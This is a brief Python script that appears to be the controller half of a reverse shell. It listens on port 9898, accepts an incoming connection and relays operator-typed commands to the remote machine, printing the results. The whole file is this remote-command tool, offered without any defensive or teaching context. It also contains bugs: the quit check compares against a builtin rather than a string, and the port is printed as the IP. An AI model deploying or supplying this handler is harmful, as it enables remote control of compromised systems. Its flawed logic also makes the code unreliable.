#importing libraries
import socket
import sys

#Create a socket
def screate():
    try:
        global host
        global port
        global s
        host = ''
        port = 9898
        s = socket.socket()
    except socket.error as msg:
        print("[-] Socket creation error " + str(msg))

#bind socket and listen for connection
def sbind():
    try:
        global host
        global port
        global s
        print("[+] Binding socket to port " + str(port))
        s.bind((host, port))
        s.listen(10)
    except socket.error as msg:
        print("[-] Socket binding error " + str(msg) + "\n" + "[*]Retrying...")
        sbind()


#+Establishing connection
def saccept():
    conn, address = s.accept()
    print("[+] Connection has been established successfully |" + "IP " + str(address[0]) + " | Port" + str(address[0]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == quit:
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            cresponse = str(conn.recv(1024), "utf-8")
            print(cresponse, end="")

def main():
    screate()
    sbind()
    saccept()

main()
